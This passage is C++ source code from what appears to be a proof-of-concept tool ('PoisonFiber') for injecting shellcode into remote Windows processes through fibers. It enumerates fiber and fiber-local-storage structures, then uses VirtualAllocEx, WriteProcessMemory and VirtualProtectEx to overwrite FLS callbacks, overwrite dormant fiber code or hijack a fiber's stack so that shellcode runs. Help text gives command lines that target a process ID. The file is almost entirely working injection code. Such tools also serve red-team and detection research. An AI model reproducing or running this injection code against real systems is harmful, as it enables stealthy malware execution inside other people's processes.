		GLOBAL_FLS_DATA globalFlsData = {};
		std::vector<FLS_CALLBACK> callbackEntries = {};
		ULONG nCallbackEntries = 0;
		PVOID pCallbackTable = NULL;
		unsigned int chunkIndex = 0;
		unsigned int idx = 0;

		/*
		* Populate GLOBAL_FLS_DATA struct.
		* flsListEntry == flsListHead, so minus 0x40 to account for flsCallbackChunks[8].
		*
		* typedef struct GLOBAL_FLS_DATA
		* {
		* 	FLS_INFO_CHUNK* flsCallbackChunks[8];
		* 	LIST_ENTRY      flsListHead;
		* 	ULONG           flsHighIndex;
		* }
		*
		* typedef struct LIST_ENTRY
		* {
		* 	struct _LIST_ENTRY *Flink;
		* 	struct _LIST_ENTRY *Blink;
		* }
		*/
		if (!ReadProcessMemory(hProcess, (PVOID)((uint64_t)flsListEntry - 0x40), &globalFlsData, sizeof(GLOBAL_FLS_DATA), NULL))
		{
			printf("[-] ReadProcessMemory failed GLOBAL_FLS_DATA struct: %i\n", GetLastError());
			continue;
		}

		// Calculate which chunk index contains ptr to callback table
		// FLS_INFO_CHUNK* fls_callback_chunks[chunkIndex];
		chunkIndex = GetFlsChunkIndexFromIndex(index, &idx);
		pCallbackTable = globalFlsData.flsCallbackChunks[chunkIndex];

		/* Callback table example in mem
		*
		*	0:002> dd 0x000001af79c45a50
		*	000001af`79c45a50  0000000b 00000000 00000000 00000000		<- 0b Number of callbacks in table.
		*	000001af`79c45a60  ffffffff ffffffff 00000000 00000000		<- index 0
		*	000001af`79c45a70  6eb13f20 00007ffa 00000000 00000000		<- Index 1
		*	000001af`79c45a80  ffffffff ffffffff 00000000 00000000		<- Index 2
		*	000001af`79c45a90  6ea16d50 00007ffa 00000000 00000000		<- Index 3
		*	000001af`79c45aa0  806fb9a0 00007ffa 00000000 00000000		<- Index 4
		*	000001af`79c45ab0  44444444 44444444 00000000 00000000		<- 0x44444444 44444444 Callback address at index 5
		*	000001af`79c45ac0  45454545 45454545 00000000 00000000		<- 0x45454545 45454545 Callback address at index 6
		*/

		// Do some ptr verification
		if (IsInvalidPtr(pCallbackTable))
		{
			continue;
		}

		// Callback table should start with its own heap block.
		if (!IsNtHeapBlockAddr(heapEntryMetaVector, (uint64_t)pCallbackTable - 0x10))
		{
			continue;
		}

		// Read first ULONG to get the number of Callback table entries & thus how many entries to read next.
		if (!ReadProcessMemory(hProcess, pCallbackTable, &nCallbackEntries, sizeof(ULONG), NULL))
		{
			printf("[-] ReadProcessMemory failed :%i\n", GetLastError());
			continue;
		}

		// Number of callback entries must be less than FLS slot maximum.
		if (nCallbackEntries > 4096 || nCallbackEntries == 0)
		{
			continue;
		}

		// Read from the first callback entry which starts +0x8 from the callback table start.
		callbackEntries.resize(nCallbackEntries);
		if (!ReadProcessMemory(hProcess, (PVOID)((uint64_t)pCallbackTable + 0x8), callbackEntries.data(), sizeof(FLS_CALLBACK) * nCallbackEntries, NULL))
		{
			printf("[-] ReadProcessMemory failed to read FLS Callback table:%i\n", GetLastError());
			continue;
		}

		// Save callback entries & other meta data
		callbackTable.callbackEntries = callbackEntries;
		callbackTable.callbackTableAddress = pCallbackTable;
		callbackTable.nCallbackEntries = nCallbackEntries;

		// At this point we have found our callback for pid & tid. So stop enumerating the remaining LIST_ENTRIES for fiber.
		return true;
	}


	return false;
}

bool InjectCallback(HANDLE& hProcess, Fiber fiber, std::vector<HeapEntryMeta> heapEntryMetaVector, int injectionType)
{
	/*
	Steps:
	1. Check to see if FLS Data is populated, this tells us if any there is anything to overwrite.
	2. Enumerate through FLS linked list to get callback table.
	3. Overwrite callback table with pointer to malicious shellcode
	*/

	CallbackTableMeta callbackTable = {};
	std::vector<LIST_ENTRY*> flsListEntries = {};
	BOOL aquiredCallbackTable = false;
	BOOL modifyUserCallback = false;
	BOOL modifyDefaultCallback = false;
	DWORD maxIndexes = 0;
	maxIndexes = GetMaxFlsIndexValue();
	size_t nBytesWritten = 0;
	uint64_t callbackTableAddress = 0;

	// Get injection type
	if (injectionType == 1)
	{
		modifyDefaultCallback = true;
	}
	else if (injectionType == 2)
	{
		modifyUserCallback = true;
	}

	printf("[+] Supplying dormant Fiber object to InjectCallback func\n");

	// Collect flsListEntry Vector from fiber.FlsData if valid
	if (!GetFlsLinkedEntries(hProcess, fiber.FlsData, flsListEntries))
	{
		printf("[-] Unable to collect FLS ListEntries list from provided dormant fiber object\n");
		return false;
	}

	printf("[+] Successfully collected FLS ListEntries list\n");

	/*
	* Get callback table
	* Test every possible index value.
	* Max value index value should be 4079 (a condition inside ntdll!RtlFlsGetValue to check valid max index supplied).
	*
	* Sometimes FLS max index doesn't work, thus our callback table ptr is empty
	* Check for this and set to max value if necessary.
	*/
	if (maxIndexes == 0)
	{
		printf("[!] max fls index value is 0. Setting to hard-coded maximum value\n");
		maxIndexes = 4079;
	}

	for (DWORD index = 1; index <= maxIndexes; index++)
	{
		if (index - 1 > 4078)
		{
			continue;
		}

		// Returns true if collected a callback table.
		aquiredCallbackTable = GetFlsCallbackTable(hProcess, flsListEntries, heapEntryMetaVector, index, callbackTable);

		if (aquiredCallbackTable)
		{
			printf("[+] Successfully collected FLS callback table for dormant fiber\n");
			break;
		}
	}

	if (callbackTable.callbackTableAddress == NULL)
	{
		printf("[-] Unable to collect valid FlsCallback table address\n");
	}

	/*
	* Print out callback table
	* NOTES:
	* The first e.g. 10 callback will point to code inside loaded modules like ntdll.
	* User defined callbacks will likely point to a JMP table (E9 near JMP) to your loaded code.
	* Overwriting a callback will likely cause the program to crash. But since we are deleting fibers, is that such an issue?
	* We could see how much space there is to over write the callback inside the program code.
	* We could look at inserting a new callback at the end of the callback table to see if that is executed.
	*/
	int counter = 0;
	printf("[+] Callback table address: 0x%llx\n", (uint64_t)callbackTable.callbackTableAddress);
	printf("[+] Number of callback table entries:%i\n", (uint8_t)callbackTable.nCallbackEntries);

	for (auto it = callbackTable.callbackEntries.begin(); it != callbackTable.callbackEntries.end(); ++it)
	{
		printf("\t[!] Callback index:%i\tCallback Address 0x%llx\n", counter, (uint64_t)(*it).callback);
		counter++;
	}

	// Allocate some space for our shellcode inside remote process
	uint64_t shellcodeLocation = (uint64_t)VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeLocation == NULL)
	{
		printf("[-] Failed to allocate VirtualMemory in remote process: %i", GetLastError());
		return false;
	}

	// Write shellcode to newly allocated remote memory region.
	if (!WriteProcessMemory(hProcess, (LPVOID)shellcodeLocation, shellcodeAddr, shellcodeSize, &nBytesWritten))
	{
		printf("[-] Failed to write shellcode in remote process: %i", GetLastError());
		return false;
	}

	printf("[+] Written shellcode to remote process at address: 0x%llx\n", shellcodeLocation);

	/*
	* We are modifying the last callback in the callback table.This is will be a user defined callback.
	* This will be triggered under either condition:
	* 1. Fiber is deleted / Thread running Fiber exits - ntdll!RtlpFlsDataCleanup
	* 2. FLS index associated with callback is freed - ntdll!RtlpFlsFree
	*/
	if (modifyUserCallback)
	{
		/* Callback table example in mem
		*
		*	0:002> dd 0x000001af79c45a50
		*	000001af`79c45a50  0000000b 00000000 00000000 00000000		<- 0b Number of callbacks in table.
		*	000001af`79c45a60  ffffffff ffffffff 00000000 00000000		<- index 0
		*	000001af`79c45a70  6eb13f20 00007ffa 00000000 00000000		<- Index 1
		*	000001af`79c45a80  ffffffff ffffffff 00000000 00000000		<- Index 2
		*	000001af`79c45a90  6ea16d50 00007ffa 00000000 00000000		<- Index 3
		*	000001af`79c45aa0  806fb9a0 00007ffa 00000000 00000000		<- Index 4
		*	000001af`79c45ab0  44444444 44444444 00000000 00000000		<- 0x44444444 44444444 User-defined Callback address at index 5
		*	000001af`79c45ac0  45454545 45454545 00000000 00000000		<- 0x45454545 45454545 Last user-defined callback address at index 6 -  [!!!OVERWRITE WITH SHELLCODE PTR!!!]
		*/

		/* Update number of callbacks field in callback table by one.
		ULONG nCallbacksPlusOne = (ULONG)callbackTable.nCallbackEntries + 1;
		if (!WriteProcessMemory(hProcess, callbackTable.callbackTableAddress, &nCallbacksPlusOne, sizeof(ULONG), NULL))
		{
			printf("[-] WriteProcessMemory failed to increase the size of the FLS callback table:%i\n", GetLastError());
			return false;
		}
		*/

		// Insert new callback (ptr to shellcode) at end of callback table.
		if (!WriteProcessMemory(hProcess, (LPVOID)((uint64_t)callbackTable.callbackTableAddress + (callbackTable.nCallbackEntries * 0x10)), &shellcodeLocation, sizeof(uint64_t), NULL))
		{
			printf("[-] WriteProcessMemory failed to append FLS callback:%i\n", GetLastError());
			return false;
		}
	}

	/* 
	* We are overwriting callback responsible for cleaning up FLS.
	* This will be triggered only when a Fiber is deleted / Thread running Fiber exits - ntdll!RtlpFlsDataCleanup
	*/
	if (modifyDefaultCallback)
	{
		// Check to see we have at least 2 standard callbacks, since we are overwriting the 2nd - (index 1 usually reserved for FlsFree())
		if (callbackTable.nCallbackEntries >= 2)

			// Overwrite 2nd callback inside callback table with our shellcode.
			// This is usually reserved for FlsFree().
			if (!WriteProcessMemory(hProcess, (LPVOID)((uint64_t)callbackTable.callbackTableAddress + (2 * 0x10)), &shellcodeLocation, sizeof(uint64_t), NULL))
			{
				printf("[-] WriteProcessMemory failed to overwrite FLS callback:%i\n", GetLastError());
				return false;
			}

		/*
		* Example of what we are overwriting at index 1
		*
		* 0:002> dd 0x000001af79c45a50
		*	000001af`79c45a50  00000005 00000000 00000000 00000000  <- 0x0b     Number of callbacks in table
		*	000001af`79c45a60  ffffffff ffffffff 00000000 00000000  <- index 0
		*	000001af`79c45a70  6eb13f20 00007ffa 00000000 00000000  <- Index 1 resolves to - ucrtbased!__vcrt_freefls - [!!!OVERWRITE WITH SHELLCODE PTR!!!]
		*	000001af`79c45a80  ffffffff ffffffff 00000000 00000000  <- Index 2
		*	000001af`79c45a90  6ea16d50 00007ffa 00000000 00000000  <- Index 3 resolves to -  ucrtbased!destroy_fls
		*	000001af`79c45aa0  806fb9a0 00007ffa 00000000 00000000  <- Index 4 resolves to -  VCRUNTIME140D!__vcrt_freefls
		*	000001af`79c45ab0  00000000 00000000 00000000 00000000  <- Padding
		*
		*/
	}

	return true;
}


/*
* Injects into dormant Fiber using either:
* Sub-technique1: Overwrites existing Dormant Fiber code.
* sub-technique2: Redirects execution to shellcode, before resuming normal execution.
*
* Works with dormant Fibers that have yet to be executed AND those which have previously been executed.
*/
void InjectInDormantFiber(HANDLE& hProcess, Fiber fiber, int injectionType)
{
	size_t nBytesWritten = 0;
	uint64_t rspValue = 0;
	unsigned char ripValue[5] = { '\0' }; // This should represent 'add rsp, 28h.ret' in KernelBase!SwitchToFiber()
	unsigned char rcxValue[5] = { '\0' }; // This should represent a NEAR JMP (5 bytes) when dormant fiber has NOT be scheduled for the first time.
	bool redirectFiberExecution = false;
	bool overwriteExistingFiberCode = false;

	// Determine injection type.
	if (injectionType == 1)
	{
		overwriteExistingFiberCode = true;
	}
	else if (injectionType == 2)
	{
		redirectFiberExecution = true;
	}

	// Print Dormant FiberContext registers
	printf("\t[!] fiber.FiberData: 0x%llx\n", (uint64_t)fiber.FiberData);
	printf("\t[!] fiber.FiberContext.Rip: 0x%llx\n", fiber.FiberContext.Rip); // Pointer to either null (if fiber hasn't already begun). Or inside SwitchToFiber
	printf("\t[!] fiber.FiberContext.Rsp: 0x%llx\n", fiber.FiberContext.Rsp); // Pointer to top of the stack
	printf("\t[!] fiber.FiberContext.Rcx: 0x%llx\n", fiber.FiberContext.Rcx); // Pointer to short JMP
	printf("\t[!] fiber.FiberContext.Rax: 0x%llx\n", fiber.FiberContext.Rax); // ???

	// Read values of registers.
	if (fiber.FiberContext.Rip != 0x0)
	{
		if (!ReadProcessMemory(hProcess, (LPCVOID)fiber.FiberContext.Rip, &ripValue, 0x5, &nBytesWritten))
		{
			printf("\t[-] Failed to read Fiber.context.rip value in remote process: %i\n", GetLastError());
		}
		else
		{
			printf("\t[!] fiber.FiberContext.Rip value (first 5 bytes):"); // switchToFiber 'ret' instruction.  
			for (int i = 0; i < 5; ++i) {
				printf("%02X ", ripValue[i]);
			}
			printf("\n");
		}
	}

	// Read Near JUMP 'E9 (4 byte displacement value).
	// This is used to find the address of Fiber code if the dormant fiber hasn't been switched to before.
	if (!ReadProcessMemory(hProcess, (LPCVOID)fiber.FiberContext.Rcx, &rcxValue, 0x5, &nBytesWritten))
	{
		printf("\t[-] Failed to read Fiber.context.rcx value in remote process: %i\n", GetLastError());
	}
	else
	{
		printf("\t[!] fiber.FiberContext.Rcx value (first 5 bytes):"); // Contains a NEAR JMP 'E9' the beginning of the dormant fiber object's FiberCode 
		for (int i = 0; i < 5; ++i) {
			printf("%02X ", rcxValue[i]);
		}
		printf("\n");
	}

	// Read first 8 bytes of the stack	
	if (!ReadProcessMemory(hProcess, (LPCVOID)fiber.FiberContext.Rsp, &rspValue, sizeof(uint64_t), &nBytesWritten))
	{
		printf("\t[-] Failed to read Fiber.context.rsp value in remote process: %i\n", GetLastError());
	}
	else
	{
		// Executable Dormant Fiber code resumption point.
		printf("\t[!] fiber.FiberContext.Rsp value Before modification: 0x%llx\n", rspValue);
	}


	/*
	* This sub-technique: Overwrites existing Dormant Fiber code.
	* 1. Checks to see if dormant Fiber has been executed (switched to) before, this changes the way we find the ptr to dormant FiberCode.
	*
	* 2.
	* 2a. If dormant Fiber has NOT been switched to before (RIP == NULL) we calculate the start of dormant Fiber's code using indirect JMP via RCX.
	* 2b. We then we directly overwrite dormant fiber code with our shellcode.
	*
	* 3.
	* 3a. If dormant fiber has previously been switched to (RIP == ptr inside KernelBase!SwitchToFiber() - add rsp, 28h; ret)
	* 3b. We calculate the ptr to dormant fiber code on the stack
	* 3c. Copy our shellcode at the end of the region of pages for the legitimate fiber code.
	* 3d. Overwrite the ptr to dormatn fiber code on the stach with a ptr to shellocode (that we have saved in the same region)
	*     This is to prevent us overwriting the call to SwitchToFiber() in the existing Fiber code & thus crashing our program before it is executed (switched to).
	*/
	if (overwriteExistingFiberCode)
	{
		uint64_t startOfFiberCode = 0;

		printf("[+] Overwriting Existing Dormant Fiber Data\n");
		printf("\t[!] Calculating address of existing Dormant Fiber Data\n");

		/*	Check to see if the dormant Fiber has been scheduled before.
		*	If fiber.Context.rip == NULL then dormant fiber has NOT been switched to (executed) before.
		*	We use fiber.FiberContext.Rcx to get indirect jump to start of code
		*/
		if (fiber.FiberContext.Rip == NULL)
		{
			uint32_t disp = 0;
			byte ins = '\x00';

			// Check rcxValue begins with indirect JUMP to start of Fiber code.
			if (rcxValue[0] == 0xE9) {

				memcpy(&disp, rcxValue + 1, 4); // Copy 4 bytes over
				startOfFiberCode = (uint64_t)fiber.FiberContext.Rcx + 0x5 + disp; // 0x5 is the size of 'JMP displacement' asm in bytes. Thus a near JMP starts from the next instruction.
				printf("\t[!] start address of dormant fiber code: 0x%llx\n", startOfFiberCode);
			}
			else
			{
				// We shouldn't arrive here!
				printf("\t[!] Unable to calculate start address of dormant Fiber code. RcxValue doesn't contain near jump 'E9 disp' value!\n");
			}

			// Overwrite start of FiberCode with shellcode.
			DWORD oldProtect = 0;
			if (!VirtualProtectEx(hProcess, (LPVOID)startOfFiberCode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect))
			{
				printf("[-] Failed to change page permissions in remote process: %i", GetLastError());
				return;
			}

			if (!WriteProcessMemory(hProcess, (LPVOID)startOfFiberCode, shellcode, sizeof(shellcode), &nBytesWritten))
			{
				printf("[-] Failed to write shellcode in remote process: %i", GetLastError());
				return;
			}

		}
		else
		{
			// If rip contains the following value then our dormant fiber has previously been switched to or it is a secondary Fiber.
			if ((ripValue[0] == 0x48) && (ripValue[1] == 0x83) && (ripValue[2] == 0xc4) && (ripValue[3] == 0x28) && (ripValue[4] == 0xc3)) {

				/* This will point to
					fiber.FiberContext.Rip: 0x7ffaca24b463 points to below inside Kernelbase!SwitchToFiber
					-->	48 83 C4 28     add     rsp, 28h
						C3              retn
				*/

				// Read value stored at 
				if (!ReadProcessMemory(hProcess, (LPCVOID)(fiber.FiberContext.Rsp + 0x30), &startOfFiberCode, sizeof(uint64_t), NULL))
				{
					printf("\t[-] ReadProcessMemory failed to read dormant fiber.FiberContext.Rsp + 0x30: %i\n", GetLastError());
					return;
				}
				printf("\t[!] start address of dormant fiber code: 0x%llx\n", startOfFiberCode);


				/*
				* If we are overwriting the existing dormant fiber .text section then aim to copy our shellcode at the end the .text.
				* This is because the end of .text less likely to contain fiber code. (due to padding).
				* It also means we are less likely to overwrite the SwitchToFiber() call in the running Fiber code.
				* If we where to overwrite the call to SwitchToFiber() before it has been executed then the program will crash without executing our shellcode.
				*
				* NOTE: If we try and change protections (Adding Write permissions) for currently executing pages, this might cause an error!
				*/
				MEMORY_BASIC_INFORMATION mbi = {};
				if (!VirtualQueryEx(hProcess, (LPCVOID)startOfFiberCode, &mbi, sizeof(MEMORY_BASIC_INFORMATION)))
				{
					printf("[-] Failed to query memory in remote process: %i", GetLastError());
					return;
				}

				// Calculate end of region, so we can write our shellcode here.
				uint64_t codeSectionEnd = 0;
				uint64_t addrToWriteShellcode = 0;

				codeSectionEnd = (uint64_t)mbi.AllocationBase + mbi.RegionSize;
				addrToWriteShellcode = codeSectionEnd - sizeof(shellcode);

				DWORD oldProtect = 0;
				if (!VirtualProtectEx(hProcess, (LPVOID)mbi.AllocationBase, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect))
				{
					printf("[-] Failed to change page permissions in remote process: %i", GetLastError());
					return;
				}

				if (!WriteProcessMemory(hProcess, (LPVOID)addrToWriteShellcode, shellcode, sizeof(shellcode), &nBytesWritten))
				{
					printf("[-] Failed to write shellcode in remote process: %i", GetLastError());
					return;
				}


				// Overwrite dormant Fiber code ptr on the stack with value that points to our shellcode withing the same region of pages.
				if (!WriteProcessMemory(hProcess, (LPVOID)(fiber.FiberContext.Rsp + 0x30), &addrToWriteShellcode, sizeof(shellcode), &nBytesWritten))
				{
					printf("[-] Failed to write shellcode in remote process: %i", GetLastError());
					return;
				}

			}
			else
			{
				// We shouldn't arrive here!
				printf("\t[!] Unable to calculate start address of dormant Fiber code. RipValue doesn't contain expected value!\n");
			}
		}

		printf("[+] Overwritten dormant fiber code with shellcode\n");
	}

	/*
	* This sub-technique: Redirects execution to shellcode, before resuming normal execution.
	* 1. Remotely allocates a new region of memory for our shellcode & copies it to that location
	* 2. Adjust the remote dormant Fiber's stack (by 8 bytes) to make space for shellcode ptr.
	* 3. Pushes the address of shellcode to top of new stack
	* Then when 'ret' is called inside SwitchToFiber() the shellcode will get executed, and normal execution will resume after.
	* NOTE: providing our shellcode continues execution (with a 'ret') & doesn't mess up stack alignment etc.
	*/
	if (redirectFiberExecution)
	{

		// Remote allocate some space for our shellcode inside remote process
		uint64_t shellcodeLocation = (uint64_t)VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (shellcodeLocation == NULL)
		{
			printf("[-] Failed to allocate VirtualMemory in remote process: %i", GetLastError());
			return;
		}

		// Write shellcode to newly allocated remote memory region.
		if (!WriteProcessMemory(hProcess, (LPVOID)shellcodeLocation, shellcodeAddr, shellcodeSize, &nBytesWritten))
		{
			printf("[-] Failed to write shellcode in remote process: %i", GetLastError());
			return;
		}

		printf("[+] Written shellcode to remote process at address: 0x%llx\n", shellcodeLocation);

		// Find address of remote dormant fiber Rsp to adjust.
		PVOID dormantFiberAddr = fiber.FiberData; // Address of remote dormant fiber in remote process.
		uint64_t offsetToRsp = 0xc8;
		uint64_t rspMinus8 = fiber.FiberContext.Rsp - 0x8;

		/*
		* How to get stack offset of remote fiber to adjust
		*	OFFSET TO  FiberContext == +0x30
		*	00000000 FIBER           struc ; (sizeof=0x520, align=0x10, copyof_295)
		*	00000000 FiberData       dq ?                    ; offset
		*	....
		*	00000030 FiberContext    CONTEXT ?
		*	....
		*	00000520 FIBER           ends
		*	-------------------------------------
		*
		*	OFFSET TO Rsp == +0x98
		*	00000000 CONTEXT         struc ; (sizeof=0x4D0, align=0x10, copyof_120)
		*	....
		*	00000098 _Rsp            dq ?                    ; XREF: __report_gsfailure+9F/w
		*	....
		*	000004D0 CONTEXT         ends
		*	-------------------------------------
		*
		*	TOTAL OFFSET == 0xC8
		*/

		// Adjust fiber.FiberContext.Rsp value by 8 bytes to include space for our new shellcode ptr.
		if (!WriteProcessMemory(hProcess, (LPVOID)((uint64_t)dormantFiberAddr + offsetToRsp), &rspMinus8, sizeof(uint64_t), &nBytesWritten))
		{
			printf("[-] Failed adjust dormant FiberContext.rsp: %i\n", GetLastError());
		}
		else
		{
			printf("[+] New dormant FiberContext.rsp: 0x%llx\n", rspMinus8);
		}

		// Copy address of shellcode to top of new stack
		if (!WriteProcessMemory(hProcess, (LPVOID)((uint64_t)rspMinus8), &shellcodeLocation, sizeof(LPVOID), &nBytesWritten))
		{
			printf("[-] Failed to write shellcode address to modified context.rsp: %i\n", GetLastError());
		}
		else
		{
			printf("[+] Overwritten dormant fiber stack with pointer to shellcode\n");
		}

		printf("[+] Redirected dormant fiber to execute our shellcode from stack first before resuming execution at original Dormant Fiber code\n");
	}

}


void PrintHelp(char* name)
{
	printf("!!POC MUST BE RUN AS ADMIN!!\n\n");
	printf("%s -h (Print help)\n\n", name);

	printf("Options:\n");
	printf("\t-e  (Remotely Enumerate Threads & Processes using Fibers)\n");
	printf("\t-p  (pid to target)\n");
	printf("\t-cu (Modify user-defined callback)\n");
	printf("\t-cd (Modify default cleanup callback)\n");
	printf("\t-do (Overwrite Dormant Fiber code)\n");
	printf("\t-dr (Redirect Dormant Fiber)\n\n");

	printf("Example: Enumerate remote Fibers\n");
	printf("\t%s -e\n\n", name);

	printf("Example: Target pid 1001, modify default cleanup callback\n");
	printf("\t%s -p 1001 -cd \n\n", name);

	printf("Example: Target pid 1001, redirect dormant fiber execution\n");
	printf("\t%s -p 1001 -dr \n\n", name);
}

int main(int argc, char** argv)
{
	bool injectIntoCallbackTable = false;
	int callbackInjectType = 0;
	bool injectIntoDormantFiber = false;
	int dormantFiberInjectionType = 0;
	DWORD targetPid = 0;
	std::vector<TidPid> tidPid_vector;
	std::vector<FiberInfo> fiberinfo_vector;

	printf(R"EOF(
__________      .__                      ___________._____.                 
\______   \____ |__| __________   ____   \_   _____/|__\_ |__   ___________ 
 |     ___/  _ \|  |/  ___/  _ \ /    \   |    __)  |  || __ \_/ __ \_  __ \
 |    |  (  <_> )  |\___ (  <_> )   |  \  |     \   |  || \_\ \  ___/|  | \/
 |____|   \____/|__/____  >____/|___|  /  \___  /   |__||___  /\___  >__|   
                        \/           \/       \/            \/     \/       )EOF");
	printf("\n\n");

	// Parse arguments
	if (argc < 2) {
		PrintHelp(argv[0]);
		return 1; // Return an error code
	}

	if (!InitializeFuncs())
	{
		printf("[!] InitializeFuncs failed\n");
		return 1;
	}

	// Remotely enumerate Fibers, prints info to screen
	if (strcmp(argv[1], "-e") == 0)
	{
		ListProcessThreads(tidPid_vector);
		GetCurrentThreadsUsingFibers(tidPid_vector, fiberinfo_vector);
		return 0;
	}

	if (strcmp(argv[1], "-p") == 0)
	{
		// Check we have been provided with a pid
		if (argc < 3) {
			printf("No PID provided\n");
			return 1; // Return an error code
		}

		// Convert the command-line argument to a DWORD
		char* endPtr;
		targetPid = strtoul(argv[2], &endPtr, 10);

		// Check for conversion errors
		if (*endPtr != '\0') {
			printf("Invalid number format: %s", argv[2]);
			return 1;
		}
	}

	if (strcmp(argv[3], "-cd") == 0)
	{
		injectIntoCallbackTable = true;
		callbackInjectType = 1;
	}
	else if (strcmp(argv[3], "-cu") == 0)
	{
		injectIntoCallbackTable = true;
		callbackInjectType = 2;
	}
	else if (strcmp(argv[3], "-do") == 0)
	{
		injectIntoDormantFiber = true;
		dormantFiberInjectionType = 1;
	}
	else if (strcmp(argv[3], "-dr") == 0)
	{
		injectIntoDormantFiber = true;
		dormantFiberInjectionType = 2;
	}

	// Stored custom shellcode as a resource. This shellcode continues execution rather than exiting (like with msfvenom payload) 
	if (!LoadShellcodeFromResource())
	{
		printf("[!] LoadShellcodeFromResource failed\n");
		return 1;
	}

	// Enumerate all threads again, since some may have exited since initial enum.
	ListProcessThreads(tidPid_vector);
	GetCurrentThreadsUsingFibers(tidPid_vector, fiberinfo_vector);

	for (auto& fiberinfo : fiberinfo_vector)
	{
		// Select target process using Fibers
		if (fiberinfo.tidPid.pid == targetPid)
		{

			HANDLE hProcess = NULL;
			// Get Handles to the thread and owning process.
			hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, fiberinfo.tidPid.pid);
			if (!hProcess)
			{
				printf("[-] Failed to open process handle\n");
			}

			// Enumerate heap block entries 
			std::vector<HeapEntryMeta> heapEntryMetaVector;
			EnumNtHeap(hProcess, heapEntryMetaVector);

			// Get Dormant Fibers
			EnumFibersFromHeapBlocks(hProcess, heapEntryMetaVector, fiberinfo);

			if (injectIntoDormantFiber)
			{
				// Just select the first dormant Fiber we have
				InjectInDormantFiber(hProcess, fiberinfo.dormantFibervector.at(0), dormantFiberInjectionType);
			}

			// We need the fiber.FlsData field to get FLSList entries & Global FLS struct. 
			// We use the Global FLS struct to find callback table remotely.
			if (injectIntoCallbackTable)
			{
				// First check current Fiber to identify if FlsData field is present
				if (InjectCallback(hProcess, fiberinfo.fiberObject, heapEntryMetaVector, callbackInjectType))
				{
					printf("[+] Injected Callback\n");
				}
				else
				{
					// If FLSData field isn't present in current Fiber then check in dormant Fibers
					for (auto it = fiberinfo.dormantFibervector.begin(); it != fiberinfo.dormantFibervector.end(); ++it)
					{
						// If successful then break, so we don't inject numerous times.
						if (InjectCallback(hProcess, (*it), heapEntryMetaVector, callbackInjectType))
							break;
					}

					printf("[+] Injected Callback\n");
				}

			}

			CloseHandle(hProcess);
			return 0;
		}
	}

	printf("[-] Unable to target PID: %i\n", targetPid);
	return 1;
}

